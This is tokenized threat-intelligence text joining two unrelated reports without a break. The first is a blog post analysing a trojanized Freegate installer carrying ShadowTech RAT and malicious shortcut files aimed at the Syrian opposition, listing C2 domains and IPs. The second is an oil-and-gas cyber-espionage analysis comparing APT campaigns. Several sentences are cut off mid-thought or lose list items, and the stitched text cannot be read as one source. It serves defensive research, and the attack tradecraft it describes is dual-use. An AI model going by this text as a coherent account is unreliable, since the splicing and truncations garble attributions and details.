Meanwhile , the Syrian opposition , and several groups working closely with it , such as Cyber Arabs , have been active in attempting to identify potential threats and warn users .
Researchers have identified a common theme among the attacks against the Syrian opposition : sophisticated social engineering that is grounded in an awareness of the needs , interests , and weaknesses of the opposition .
Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files , or exploit fears of hacking and surveillance with fake security tools .
Attacks are often transmitted to potential victims from the accounts of people with whom they are familiar .
The two attacks that are described in this blogpost follow this theme .
One is a malicious installer of the circumvention tool Freegate .
The other is an e - mail attachment calling for jihad against Hezbollah and the Assad regime or promising interesting regional news .
In this attack , which we first observed in the second week of June , the potential victim is encouraged to visit a download link containing a malicious installer of Freegate .
Freegate is a standalone circumvention - bypassing Virtual Private Network ( VPN ) client for Windows .
Legitimate versions of the Freegate software are available for download on its website .
While initially developed for mainland Chinese users , the software is used in a number of other countries .
While Freegate was erroneously labelled a Trojan by one anti - virus company nearly a decade ago , in this attack , attackers packaged what appears to be a legitimate version of Freegate with a malicious implant .
The targeted group were members of the Syrian opposition in a private social media group .
When VPN - Pro.exe is run , the victim is shown the Freegate end - user license agreement ( EULA ) dialogue box .
Upon agreeing to the EULA , an operational copy of Freegate proxy is launched , which includes a request to unblock the firewall .
The copy of Freegate launched is listed as `` Freegate 7.35 Professional Edition .
In addition to running a legitimate copy of Freegate 7.35 , the malware installs an implant .
A fake `` svchost.exe '' is installed in the victim 's Application Data directory : C : \Documents and Settings\ < Username > \Application Data\svchost.exe Dropped files on execution of VPN - Pro.exe : Examination of the `` svchost.exe '' binary shows multiple references to `` ShadowTech Rat .
Packet capture on port 1321/tcp : ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both English and Arabic language sites .
Videos can be found on YouTube demonstrating its functionality .
The tool offers a range of options to the attacker , from keylogging and remote activation of the webcam to file exfiltration .
As of June 20 , 2013 , svchost.exe was only detected by four out of 47 tested anti - virus programs , while VPN - Pro.exe was only detected by five out of 46 .
The svchost.exe initiates an outbound connection to a command and control ( C2 ) server hosted at thejoe.publicvm.com .
This domain resolves to an address inside Syrian IP space : 31.9.48.119 .
This is not the first time that malicious installer packages have been created for circumvention tools .
In 2012 , malicious installers for Green Simurgh - a standalone proxy intended for Iranian users but also used by some Syrians - were found in circulation .
The creators of Green Simurgh responded by posting a prominent warning on their website highlighting the presence of these malicious installers .
Last year , malware which purported to be the Tor Browser Bundle was found in the wild .
It was found to be backdoored by Gh0st RAT and exfiltrated data to an IP in China .
An attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious as it targets users who likely recognize the importance of privacy and circumvention , and may believe that they have increased their privacy and security by installing the tool .
In this campaign , contact with targets was initiated through phishing e - mails , chat messages and Facebook posts .
Although we became aware of this campaign in early June , we have evidence that it may have started as early as January 2013 .
We believe that this campaign targeted - at least in part - high - profile members of the Syrian opposition .
Interestingly , the attack included targeting of at least one non - public address associated with internal opposition communications .
This indicates some degree of prior penetration of the opposition - either through computer network intrusion or other intelligence gathering activities .
The potential victim in this attack first receives a message from an unknown source , in this case , a Gmail account with a nondescript name .
Example e - mail : The e - mail contains text , an image ( not shown ) , and an attachment .
The text refers to a video of Sheikh Adnan al - Arour - a Sunni pro - opposition cleric - based in Saudi Arabia , calling for holy war against Assad and Hezbollah .
The user is led to believe that opening the zip file , which is descriptively titled as being the Sheikh 's opinion , will provide access to the video .
While we have identified multiple different attacks with different zip files , the structure of all of these is consistent with the example described here .
Example zip files : The zip file extracts to a Windows Shortcut file with the same name and a .lnk
Example .lnk
Parsing `` Sample A '' : When the victim executes the Windows shortcut , they are directed to one of several malicious links depending on the zipfile that they were sent .
These are visible in the link parsing .
Links embedded in the Windows shortcut : The victim is then shown either a YouTube video featuring Sheikh Adnan al - Arour , or a story on http : //www.alkalimaonline.com , a Lebanese news site .
Example of YouTube video shown to victim : While the victim sees the decoy YouTube video or news website , a php file ( g.php ) that contains a hex - encoded malicious binary is fetched .
Excerpt from G.php : Once extracted , the binary of `` Sample A '' has the following properties : The malware also adds a registry key to make it persistent across reboots : The malware contains strings referring to `` Data Protector v2 '' which appears to refer a crypter that is compatible with a range of RATs and advertised for download in a number of forums .
Once the malware is successfully installed on the victim 's computer , it communicates with a C2 server at : tn5.linkpc.net On June 11 , this pointed to the following SyriaTel address : This domain has been active since at least October 2012 and has pointed to many different addresses in Syrian IP space on both the SyriaTel and Tarassul ISPs , as well as AnchorFree VPN addresses .
The malware attempts to download a remote file called `` 123.functions '' : It was not possible to retrieve the remote file at the time of analysis .
As the conflict in Syria drags on , digital campaigns targeting Syrian opposition have persisted .
We have chosen to highlight two attacks that are part of recent efforts by Pro - Government Electronic Actors to compromise opposition communications and steal their secrets .
These attacks cater to the opposition 's communication behaviors and tactics .
They are indicative of a combination of prior intelligence about the opposition , and ingenuity in social engineering .
For example , many in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase their communications security and privacy .
Tools and information about security and communications are in constant circulation .
Some of this material addresses well - defined vulnerabilities .
We have observed a greater degree of care among many in the opposition when facing certain situations that were common attack modalities in 2012 .
As awareness grows and behavior evolves , we suspect that some of the attacks that we regularly observed in 2012 are much less successful today .
Some of the information and practices that are shared between users , however , are much less appropriate , even inadvertently dangerous .
For example , many legitimate tools are shared via third party file sharing sites or over social media .
This situation presents a rich variety of targets for attackers in which to seed malicious binaries and links masquerading as familiar or desirable tools .
We infer that from the point of view of these attackers , not all attacks need to have sophisticated malware in order to be successful enough to be worth doing .
Yet , perhaps in response to the growing awareness of previous and often widely targeted attacks against the Syrian opposition , attackers continue to innovate and experiment with new techniques that blend social engineering with new attack styles .
The experiments are sometimes clearly successful .
For example , in the case of Attack 2 , the Windows shortcut files were not conclusively identified as malicious by even savvy opposition members for an extended period of time .
We hope that this post will increase awareness of the two attacks among potential targets .
In the meantime , users who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should consider their computers and accounts compromised .
The Freegate website is blocked in China ( its primary target market ) , as is the case with other similar circumvention tools .
To get around blocking , tools are often distributed between individuals , or through untrusted downloads from third party sites .
This is an unfortunate vector for attackers to distribute malicious installers and bundles that also contain functional versions of the program .
As demonstrated by our work on the Freegate malware , as well as the Green Simurgh case , these vulnerabilities are exploited with serious consequences for high - risk users .
We understand the resource constraints that developers of free security and circumvention software often face .
As such , we propose two simple steps that Freegate could take to help mitigate the current and similar future threats .
We provided Freegate developers with details of the attack , copies of the malicious binary , and other details prior to publication .
We would like to point them towards the example established by Green Simurgh , who promptly posted a multilingual warning to their website when a malicious repackaging of their tool was found to be targeting Syrian users .
We have offered to help them translate any warning materials into Arabic .
Currently , visitors to the Freegate website follow non - HTTPS links to an unencrypted download .
We believe that this presents a clear risk for man - in - the - middle attacks .
Most developers of similar anti - censorship , circumvention , and security tools have implemented this security measure .
We encourage Freegate to follow suit .
Crude Faux An Analysis of cyber Conflict Within the Oil & Gas Industries The oil & gas industry is a multibillion - dollar industry that has a history of conflict .
As modern technology has developed , both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain .
The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability .
This report examines how these vulnerabilities have been exploited , and what that means to the future of the industry .
The oil & gas industry is a multibillion - dollar industry that has a history of conflict .
As modern technology has developed , both the corporate aspects and technical aspects of the oil & gas industry have become heavily reliant on the Cyber domain .
The inherently insecure origins and evolution of computing has led that dependence to become a severe vulnerability .
Recent events have brought this fact to light with a deluge of `` cyber attacks '' launched globally against the industry .
These attacks raise specter of cyber conflict and the question of culpability .
This report seeks to analyze a selection of these events , looking for patterns that would indicate one or more advanced actors .
By observing the motives means and opportunities presented to actors , and looking at a cross section of these attacks over time , conclusions will be drawn as to the past , present , and future of cyber conflict within the industry .
The US Army notes in their Cyber Concept & Capabilities plan for 2016 - 2028 that cyber capabilities pose a unique and attractive opportunity to an inferior enemy to gain equivalence temporary equivalence with a superior enemy through the use of Cyber .
This applies not only to nation states , but non - state actors as well .
There are several factors compounding this issue : - Unfettered access to the infrastructure and tools used to conduct cyber operations by anyone - A low barrier to entry fiscally and limited experience required to achieve an outsized impact - A high and attractive return on investment - Plausible deniability due to issues with attribution These facts make it highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes .
Using OSINT techniques , information was gathered from government websites , corporate websites , news agencies , and search engine queries .
This information was then synthesized and scrutinized for possible links and attribution .
By looking at the surrounding geopolitical events , gains and losses as well as indirect outcomes , events can be correlated and attributed to actors which possess the means motive and opportunity to do so .
The primary purpose is to analyze the event regardless of attribution .
Because of the nature of open source information , biases are naturally introduced which must be acknowledged , if not accounted for .
Incidents were selected based on relevance and their timeliness , along with other factors discussed in the methodology .
Incidents were largely grouped into one of three categories : espionage , sabotage , and incidental / miscellaneous .
While these incidents do not qualify as warfare by the Clausewitz definition , they are a form of conflict .
There is significant evidence of protracted , insidious espionage carried out by a state actor within the cyber realm .
China has likely launch hundreds of cyber attacks against the oil and gas industry since as early as 2002 .
With the advent of Red October , they may not be the only actors in the game .
With a level of sophistication not yet observed publicly in this realm , Red October could represent an evolution to China 's current techniques , or another actor entering the game .
By looking at some of the technical aspects of the events , a link was established between Byzantine Candor and APT1 , as well as a possible link between the Mirage Campaign and Elderwood Project .
The Middle East has scene perhaps the most evidence and variety of cyber conflict of all .
While staying away from events which do not directly relate to the oil industry , a series of sabotage incidents using cyber as the medium are examined .
It is possible that there events were salvos between nation states in an example of bidirectional conflict .
If this is not the case , and incidents like Shamoon were simply the act of non - state actors , then it represents affirmation of the revelence of non - state actors in future cyber conflict .
This is only logical since most of America 's critical infrastructure is controlled by the private sector , and economic influence can be leveraged to gain great power .
By taking an adversarial look at the Deepwater Horizon oil spill , an example of how a state actor could act in a violent , kinetic way against a non - state through cyber while remaining anonymous is examined through a vignette .
It is determined that while the Deepwater horizon spill was not an attack , it easily could have been .
This type of conflict is both deadly and catastrophic , and while it is unlikely to be used lightly , it sets the tone for possibilities going forward .
Based on the observed events , the possible threat actors , and the correlation of these events , it appears that there is ongoing cyber conflict within the oil industry .
The correlation of several incidents has shown coordinated attacks by an advanced foreign threat actor against multiple entities with the use of espionage .
It has also suggested the possibility of more destructive attacks , and pointed out the benefits to both state actors and non - state actors within the oil industry .
In some cases there has been an obvious alignment of political , strategic , operational , and tactical goals and principals to affect favorable outcomes .
The culmination of these findings is that there are many threat actors who are currently engaged in , or may be engaged in , ongoing conflict which may have the potential to escalate .
This should be both a primary concern and a cause for future research and analysis .
Recent events of national significance within the oil & gas Industry have brought to light both the question of defining threat sources and that of plausibly attributing known events to a threat source .
The unprecedented rise in cyber events begets the question of whether this is incidental to the continued advancement of technology , or suggests an ongoing conflict that may escalate .
This report will aggregate relevant events , present criteria for outlining threat origins , and determine the likelihood that the incidents are related .
It also seeks to determine whether or not any observed correlation points to a persistent aggressor or simply circumstantial coincidence .
The purpose of this analysis is to provide decision - makers with a clearer idea of the current security outlook for the oil and gas industry , and pinpoint what current and future causes for concern appear to be .
All events and presented options should be considered cautiously and as empirically as possible ; any assumptions that are made will be explicitly stated .
One of the first priorities is to outline a timeline of events which have occurred and then examine what significance they may have or relationships they may share in order to scope the conversation .
These events will constitute the frame for the analysis .
Events were chosen after a preliminary overview of content from open sources such as established news media sites , oil & gas company websites , Google query results , government bulletins , and technical reports by security companies .
From this brief overview , events within the Oil and Gas Industry which exhibited a `` cyber '' component were selected .
These events are not meant to be all inclusive , and due to the entirely open source nature of the resources , the vantage point on the information may be biased and in many instances is likely incomplete .
However even an incomplete view may contain enough information to identify significant patterns , and by acknowledging the quality concerns with the information , a more accurate and objective analysis may be performed .
Below is a timeline of observed events which will be discussed in greater detail .
The timeline will list the event and the apparent target of the event .
Given this data set , a natural escalation of events appears to occur , with the frequency of incidents continuing to rise .
This can partially be explained by a growing international awareness of the vulnerabilities and perils involved in internet - facing control systems of all kinds ; as events occur , they garner additional attention and therefore induce additional incidents .
However , there are other interesting observations to be made from this data .
Largely , the incidents of great note have occurred in either North America or the Middle East .
When considering that three of the top five oil producing countries are in these regions ( Saudi Arabia , the United States , and Iran ) , this is not surprising .
Yet substantive reports of similar incidents are markedly absent in the other two of the top five oil producing countries ( China and Russia ) , and this is noteworthy .
The argument could be made that this is due to language barriers and tight control on information dissemination , but it is improbable that a significant incident would have gone entirely unnoticed by all media outlets .
As the incidents themselves make apparent , human threat actors are involved , and what remains to be identified is whether there is the complexity , overarching coordination , or recurring threat source that would point to an advanced threat such as a state actor or complex non - state actor .
Before continuing with the possible attribution of events , some base discussion and criteria for the threat sources must be established .
A threat source is considered to be a human - based or natural entity which possesses a capability that aligns with an unmitigated vulnerability .
The threat sources which will be considered must meet the minimum requirement of having both the motive and the means to carry out the attack .
Once a hypothesis consisting of these elements is established , it will be scrutinized to determine whether or not the events surrounding the incident or series of incidents align in any obvious political , strategic , operational and tactical manner .
The means in this case consists of both the opportunity and the technological capability to cause the incident to occur , and the motives that will be considered are economic gain , retribution , or political agenda ( to include ideology ) .
The US Army notes in their Cyber Concept & Capabilities plan for 2016 - 2028 that cyber capabilities pose a unique and attractive opportunity to an inferior , asymmetric enemy to temporarily gain equivalence with a superior enemy because of its relatively low initial cost , high return on investment , and plausible deniability due to issues with attribution .
Because of this fact , it is highly likely that multiple foreign agencies as well as powerful corporate denizens have used and continue to make use of cyber capabilities to affect favorable outcomes .
The rest of the report will attempt to substantiate this claim through critical analysis .
To reach the conclusions presented in the ensuing report incidents were collected and chosen based on the inclusion of cyber either as the medium for the event , or as some component factor that played a direct or otherwise instrumental role in the outcome .
After collecting a sampling of incidents into a dataset , these incidents were examined and several directly attributable features / impacts were taken into account , including : - The victim ( s ) targeted - Evidence of cyber involvement - Economic losses - Fatalities incurred - Geopolitical impacts Beyond the direct impacts , it was also necessary to consider possible indirect `` ripple '' effects .
For example , it could be important to consider something like the prices of crude oil prior to and after a given incident .
A circumstance may be such that particular companies or countries unaffected by the incident would find themselves benefiting from a ripple effect like higher crude prices .
Other effects to identify include changes in the status of the involved companies throughout an incident .
This could involve looking at earnings reports , the selling or buying of assets , or any legal actions the company is involved in , as well as contextual events that are significant or contentious and occur directly prior to or after an incident .
Through the investigation of these outcomes and contexts , there is the possibility of finding correlations between various incidents .
These correlations may be made plain by observable patterns among the details of the events .
An observed pattern may suggest a recurring actor - these patterns include tactical and methodical similarities between alleged attacks , recurring targets , entities that directly or indirectly benefitted or incurred losses as an outcome , and geographic dispersion or closeness of the events .
In cases where an attack is apparent , tactical elements such as tools were scrutinized as well , as a means of attribution .
For example , a tool may unintentionally exhibit cultural tendencies such as the language used , colloquialisms , idioms , religious preference , and recurring personal habits of the creator or operator .
These signatures coupled with aspects of the tactical assets like exclusiveness ( as in the case of a purchased domain used as a C2 point ) can significantly raise the confidence level of an attribution .
Possible actors in the cyber exchange can ostensibly be identified from these correlations .
If it is determined that the incident was an attack , motives of the potential actors can be considered .
A key element of this that should be considered is any precedence for the attack .
The history of political relationships between countries , such as any expressed hostilities or allegiances and treaties , may also prove relevant .
History also tells us that most conflicts arise over the acquisition of resources .
As such , the energy resources and requirements of nation - states must be analyzed .
For example , is the entity being examined a major importer or exporter of oil ? Is the entity capable of energy self - sufficiency ? Or has the country been experiencing a major influx in energy demand ? This information can then be aggregated and synthesized into a more informed view of the event .
A final major component of the analysis was the examination of whether the motives and methods align with the actor 's strategic culture .
This includes defining the overall strategic theories that the country adheres to and goals it desires to accomplish .
As mentioned earlier , the tactics employed during the attack can be incredibly potent as an attribution mechanism - if an attack is far removed from a nation 's capabilities , it is less likely that they were involved in the incident .
Likewise , if the tactics are within a given nation 's technical prowess and follow established patterns exhibited by that nation , it significantly improves the confidence in attribution .
However , caution was taken when attributing tactics to actors , as deception is a common element in many cyber warfare strategies .
Therefore , tactical similarities or dissimilarities alone do not implicitly identify or rule out a given actor .
The nature of OSINT gathering poses obstacles to objective analysis .
While gathering the data , it should be noted that there are source biases .
All of the sources used are open source , and as such the provenance of the information can not always be independently verified .
The information itself may be legitimate , but presented in an incomplete or skewed manner .
It is also likely that not all of the details of the collected incidents are available .
In some cases the companies reporting the incidents , such as Symantec and MacAfee , are not legally disposed to divulge select information about their customers .
Another limitation is information available about incidents that occurred in foreign countries .
Due to tighter control over journalism or language barriers , other countries are likely not releasing full details from incidents that have occurred or not doing so in languages familiar to the authors .
In some cases , entire events may not be released to the public , either by foreign governments or the companies themselves .
In order to address the above concerns , several methods were used .
Data was gathered from established , and ideally trustworthy , sources .
This includes reports from reputable news sites , company or government publications , or scholarly papers .
Also , every effort was made to track down the original source of the information found in reports , or cross - examine it with other sources .
Multiple sources were found wherever possible and scrutinized in order to obtain corroborating data .
Of equal interest is information which was contradictory between sources .
These contradictions were presented and addressed where appropriate .
Finally , despite evidence found in support of any given actor , alternate hypotheses must be considered .
As with any intelligence gathering , there is the possibility of error , whether information is misreported or taken out of context , and this is especially true of OSINT .
The purpose was not to select an outcome and attempt to support it but rather to find refutation as well .
Information that may exculpate a particular actor was thoroughly considered .
Although human error is common in cyber incidents , it is important to determine whether the error was taken advantage of by others .
One of the most easily distinguishable patterns on the above timeline is the growing frequency of reported cyber espionage .
This saga of long - term campaigns has been garnering a lot of attention , and with good reason .
Some have asserted that certain campaigns have existed since the early 2000 's , yet their existence has only recently come to light in the private sector .
The damage caused by these types of breaches is difficult to estimate because it occurred over such a long time span , but in some cases terabytes of data were stolen over the period of a few months .
When taken in relation to the oil industry , where proprietary information like bid exploration data is the lifeblood of the organization , this can be a disastrous blow .
However , while campaigns like `` Night Dragon '' are pointedly targeted at the oil industry , others are far more encompassing in their breadth and appear more disparate .
Establishing a baseline or pattern within this industry alone excludes a large and potentially useful amount of context .
Not only were most of these cyber espionage campaigns larger in scope than simply the oil and gas industry , but some also completely excluded it .
Interestingly , there are other cyber espionage campaigns not listed in the timeline ( such as the infamous Flame and Mahdi viruses ) that target countries with some of the largest oil reserves in the world , but the attacks themselves were not targeted at the Oil & Gas Industries .
Given the sheer number of incidents , it would seem likely that there is more than one source , yet the technical data available seems to suggest otherwise .
It is clear that these incidents represent a huge danger to the profitability and competitiveness , even the future success , of victim companies ; Yet these consequences carry with them some level of inherent attribution .
The very nature of proprietary information means that if an entity who had acquired it were to use the information , it could identify them as having a connection to the incident , whether directly or through a third party .
Also , attacks of this scale require some level of organization that manifests itself in the form of repeated patterns of be- havior and resource usage that can suggest a common origin .
This organization coupled with the resources and expertise necessary to process and analyze the exorbitant volume of stolen information leads to a high likelihood of state actor or organized criminal involvement .
One of the largest difficulties present in identifying the provenance and totality of these attacks is that there is no publicly available aggregation of the body of information collected on the various APT activities .
Instead , Antivirus & Incident Response firms which have the best vantage point on the situation are providing separate reports in which they use their own colloquial names and terms for the attacks , the tools , and the campaigns .
This creates overlap , where campaigns with different names may in fact be part of the same campaign , and the technical data that is otherwise separated across the reports could together represent a more apparent pattern .
Only one report , the Mandiant APT1 report , included a brief table noting that they had compared some of the other attacks and ruled out APT1 as the culprit .
Additionally , these firms are entrusted with the safeguard of their customers ' information , and so often will not release the full extent of what was found , nor a definitive list of victims – adding to the obscurity .
These sources also introduce their own biases which must be accounted for .
For this reason , what follows is an overview of the various reports that mention the oil and gas industry as targets , and an analysis of important technical aspects and goals of these campaigns .
Through this analysis , hopefully a more complete view of the action may be obtained to see if the goals , resources , techniques , and timeframes exhibit commonality between attacks .
Synopsis : The NightDragon report released by McAfee was somewhat of a seminal event in that it was the first well known release of a fairly detailed APT analysis and technical attribution .
The attacks conglomerated in NightDragon were nearly all conducted against unspecified `` global oil , energy , and petrochemical companies .
Access sensitive documents 4 .
Upload RAT malware to exfiltrate sensitive data 5 .
Move laterally McAfee was also able to identify much of the generic malware used , and communications techniques .
They also suggested that the attackers worked between 9:00am and 5:00pm Beijing time during weekdays , and that most traffic was originating from the Shandong Province of China .
Purpose : Exfiltration of `` competitive proprietary operations and project - financing information with regard to oil and gas field bids and operations '' & collection of data from SCADA Systems Entry Method : Social Engineering , Spear Phishing , SQL - injection Countries with Companies Affected : U.S. , Taiwan , Kazakhstan , Greece Synopsis : Symantec observed a group it refers to as the Elderwood gang operating a concerted campaign against a variety of industries including an undisclosed oil and gas company .
Symantec also asserts that these are the same hackers who operated in the `` Aurora '' campaign against Google in 2009 .
This campaign is unique to some degree in that it used a high number of zero day exploits in Adobe Flash and Microsoft 's Internet Explorer .
While it appears that the attackers used spear - phishing ( via email ) , their primary technique was the use of a `` watering - hole '' attack whereby they attack websites known to be frequented by the target using techniques such as SQL injection , and upload malicious files to these website .
The target then visits the site and gets infected .
This is interesting because the target does not have any indication that it has been compromised , but the number of overall infections goes up because of untargeted victims which also visit the site .
This attack requires the attackers to find security vulnerability in the desired website after selection , requiring more technical skill than some of the other campaigns initially exhibit .
Symantec believes that the exploits were packed with a Trojan and Command & Control ( C2 ) server address using a platform that gives the group its name : `` Elderwood .
The report itself is very sparse on any technical details or evidence , largely lacking substance .
It provides a list of victims by industry and their country of origin .
It also provides a detailed timeline for the attacks .
Interestingly , Eugene Kaspersky heavily criticized the report for being alarmist and skewed , stating that many of the conclusions were presumptive .
Purpose : Exfiltration of `` a historically unprecedented transfer of wealth - closely guarded national secrets ( including those from classified government networks ) , source code , bug databases , email archives , negotiation plans and exploration details for new oil and gas field auctions , document stores , legal contracts , supervisory control and data acquisition ( SCADA ) configurations , design schematics , and much more '' Entry Method : Spear Phishing Countries with Companies Affected : U.S. Synopsis : Dell SecureWorks gives a fairly good collection of technical details about the campaign they ' ve dubbed `` Mirage '' for the string used to connect to the C2 server by the Remote Access Trojan , but largely they focused on studying the tool , not monitoring the APT activity .
Some points of note are the use of HTRAN ( a relay that Dell 's Cyber Threat Unit asserts was developed by the Honker Union of China , or HUC ) for relaying , and registry of a few domains to an email address ( dnsjack @ yahoo.com ) and IP ranges in China .
Purpose : Theft of `` intellectual property and company secrets '' Entry Method : Social Engineering , Spear Phishing , SQL - injection of web servers Countries with Companies Affected : Philippines , Canada Synopsis : Red October is a sophisticated espionage network very much unlike other attacks which had been reported .
While for the most part , the targets were diplomatic , there were several instances where Kaspersky noted that oil and gas industries had been targeted .
The attack used domains registered to Russian email addresses , and IP ranges identified were serviced by largely German and Russian ISPs , however Kaspersky believes that the three `` mothership '' C2 servers identified are actually themselves proxies for an as yet unidentified C2 server which could then be operating nearly anywhere .
A salient point is that Red October made use of exploit code that was `` created by other attackers and employed during different cyberattacks .
The attackers left the imported exploit code untouched , perhaps to harden the identification process .
Purpose : `` gather intelligence from the compromised organizations '' Entry Method : Social Engineering , Spear Phishing , SQL - injection of web servers Countries with Companies Affected : Azerbaijan , Belarus , Turkmenistan , UAE Synopsis : The APT1 Report is perhaps the most detailed report to date .
They also minced no words , directly accusing China as a state actor of engaging in Cyber Espionage .
Researchers at Mandiant tracked back activities of an APT group they referred to as APT1 to the Chinese PLA Unit 61398 with relatively solid evidence .
They even went so far as to report the building which they believed APT1 was operating out of , and unmask three operators – UglyGorilla , DOTA , and SuperHard – giving possible real names , online personas and other identifying information about them .
The attackers maintain access to a given network for nearly a year on average .
The attackers operated during the 9:00am to 5:00pm Beijing Time and thy followed a fairly strict methodology of attack , similar to the one noted in the NightDragon report : 1 .
Initial reconnaissance 2 .
Initial compromise of a system , largely though spear phishing 3 .
Establishing a foothold in the network through Trojan dropping to a C2 server 4 .
Escalating privileges through credential harvesting 5 .
Internal reconnaissance of the network and While Mandiant generically refers to energy companies , one of the trojaned files they note was used in the spearfishing attack bears the name `` Oil - Field - Services - Analysis - And - Outlook.zip '' which really ties .
Mandiant notes that APT1 is also referred to as the Comment Group , a name given for the communications method used by their RATs which would set attributes in web pages as a means of C2 .
Purpose : Exfiltration of `` competitive proprietary operations and project - financing information with regard to oil and gas field bids and operations '' Entry Method : Spear Phishing Countries with Companies Affected : Undisclosed Synopsis : An exposé run by Bloomberg in 2012 chronicled the undertakings of a security research coalition which decided to track one of the largest Cyber Espionage groups operating out of China .
Bloomberg claims that US Intelligence had been keeping tabs on the group for years , which they referred to as Byzantine Candor .
In the same breath , Bloomberg notes that the group is often referred to as the `` Comment Group .
The report included an infographic that identified oil and gas victims of the comment group .
Purpose : `` the biggest vacuuming up of U.S. proprietary data … ever seen '' Entry Method : Social Engineering , Spear Phishing Countries with Companies Affected : U.S. , United Kingdom Between the campaigns identified above , there are a few technical similarities that arise .
As was already addressed , these attacks have been selected for one common thread they share – targets within the oil and gas industry .
Other between them will now be scrutinized to find any additional links .
This is not intended to suggest that the same group is behind every attack , but rather identify tactical and operational similarities that would point to a unified source of training or control .
One of the most obvious similarities between all of the attacks is the motive : the large scale theft of corporate data .
The methodology of data extraction is very similar between Night Dragon , Shady RAT , Elderwood , APT1 , and Byzantine Candor .
One note on this is that although the attacks all followed a similar methodology , this very methodology is common in the network penetration t world , and so not entirely unique .
Slides from a presentation given by SANS affiliate James Shewmaker in 2008 highlight this methodology in brief : Reconnaissance , Port / Vulnerability Scan , Exploitation , and Repeat from the new vantage point .
The only thing largely different is that the data exfiltration occurs after exploitation – that and the attackers were working from the outside initially , so they used social engineering to get in .
With that said the fact that the majority of these used highly targeted spear phishing and exfiltrated similar data using RATs is not to be discounted .
Additionally , these attacks all appear to be operating out of either Beijing , Shanghai , and Shandong province .
The data below will show that Byzantine Candor and APT1 are one in the same – they share operators ( Ugly Gorilla ) and unique technical infrastructure like Fully Qualified Domain Names ( FQDNs ) .
Mandiant tied APT1 back to the PLA , and a .
Mandiant even acknowledges the article written by Bloomberg in their report , and identifies the `` Comment Group '' as an alias While about half of the reports omitted IP ranges , the majority of IP address ranges mentioned came from service provided by China Unicom to one of two locales : Beijing or Shanghai .
The major exception to this is Red October , which largely had IP address ranges coming from Germany and Russia .
Excluding Red October , in cases where ranges did not come from Beijing or Shanghai , they were often identified as host that were compromised and used as proxies loaded with tools such as HTRAN .
Interestingly Night Dragon , which does not provide a range of IP addresses , offered instead that an individual operating out of Heze City , Shandong , China was responsible for providing the C2 servers through his company .
An article published in the Wall Street Journal notes that McAfee identified this individual as `` Song Zhiyue .
Of the domains which appeared in the reports , only matches between APT1 and Byzantine Candor were identified .
The rest were inconclusive as some of the reports did not include FQDNs and others which did include them did not provide a full list .
Additionally , a large portion of the attacks made use of Dynamic DNS services , where the parent domain is not inherently malicious .
But subdomains may be used by service subscribers for their own purposes without policing .
With that said , there is another somewhat tenuous connection between two of the campaigns : Mirage and Elderwood .
Night Dragon is not the only instance where an individual in China is charged with providing infrastructure to the attackers via their business – HB Gary authored a report in the wake of Operation Aurora which implicated a business called Bentium operating 3322.org out of Changzhou and a man named Peng Yong as providing dynamic DNS services to the attackers .
Operation Aurora was tied to Elderwood in Symantec 's Elderwood Project report and elsewhere .
Dell Secureworks which authored the Mirage Report also authored a piece known as the Sin Digoo Affair .
The connecting factor between the Sin Digoo affair and Mirage was that an operator reused several email addresses ( jeno_1980 @ hotmail.com & king_public @ hotmail.com ) and infrastructure between them .
The C2 servers used a Dynamic DNS service operated by 3322.org .
The Sin Digoo Affair also ties these back to Gh0stNet via 3322.org and the RSA breach based on the reuse of IP address blocks belonging to the `` China Beijing Province Network ( AS4808 ) .
According to Steve Ragan of the Tech Herald , Peng Yong is possibly the author of the CRC function used in some of the Aurora malware .
It is entirely possible that 3322.org was providing services to multiple separate APT groups , it is after all a fairly successfully Dynamic DNS service which has been documented in other malware cases .
However , Peng 's level of involvement in the Aurora campaign should be scrutinized .
Interestingly the Sin Digoo report also attempts to identify the jeno_1980 account which had the alias `` Tawnya Grilith '' attached to it .
In the process of their investigation , they tied back the account to an operator going by the screen name `` xxgchappy .
This is potentially significant because it is the time frame around which the leaked US embassy cable had noted possible PLA cyber espionage activity .
Malware used by this actor , as well as appearing in Mirage and Gh0stNet , was discovered in 2011 and 2012 to have infected government ministries in Vietnam , Brunei , and Myanmar .
Additionally there are a few infected victims in Europe and the Middle East belonging to `` government ministries in different countries , an embassy , a nuclear safety agency , and other business - related groups .
However , in order to more fully analyze any connections between the domains that were listed in each of the reports , the whois and ARIN records could be examined .
The contact information could then be cross - referenced to find similarities .
Unfortunately , many of the domains had their contact information scrubbed or have since changed hands in the wake of the reports being released , so an analysis at this point would be erroneous and incomplete at best .
A final note on domains is that many of the reports did look for registrant information – in the case of APT1 for instance , many registrants blatantly put China as their place of origin , or poorly masked this fact by misspelling the places they chose or including a Shanghai phone number .
In the case of Red October however , all registrations with the exception of one were done with `` .ru
This signals a much more concerted effort to remain anonymous , and a level of professionalism not seen in the other attacks .
Considering the information which was discussed and presented , below is a revised attack timeline , consolidating individual campaigns into the likely perpetrator of the attack and extending as necessary .
Using the technical data and behavioral analysis above , individual incidents of reported hacking in news media can be connected to campaigns .
Below are several incidents that demonstrate strong correlation to the information discussed above .
Norway had the most prolific series of cyber - attacks in the country 's history in November 2011 .
As reported by Norway 's National Security Agency ( NSM ) , more than 10 firms were targeted by an advanced persistent threat using spear - fishing attacks , many of which were in the oil industry .
The attacks may have been ongoing for over a year .
The companies were unaware of the attacks until concerned employees reported receiving suspicious emails .
No specific information was released on the tools or malware that were used to conduct these attacks ; however NSM noted that a virus was used in conjunction with tailored spear - fishing attacks making use of trojan attachments .
It appeared that the purpose of the attacks was large - scale data exfiltration .
As was the case in Night Dragon , the NSM bulletin suggests that the attacks varied slightly each time so as to avoid AV detection .
An article by Defense News quotes NSM as stating that `` the attacks have , on several occasions , come when the companies have been involved in large - scale contract negotiations .
Interestingly , in 2010 Norway 's Statoil was engaged in negotiations with China Oilfield Services , Ltd. ( COSL ) .
According to the Wall Street Journal , COSL is the `` oil - field services and rig - construction unit of state - controlled China National Offshore Oil Corp. , the country 's largest offshore oil and gas company by output .
This would seem to be consistent with the types of information sought in both Night Dragon and APT1 .
The timeframe of the attack aligns with the event timeline listed in the APT1 report , and within the report there is an event appearing in Norway .
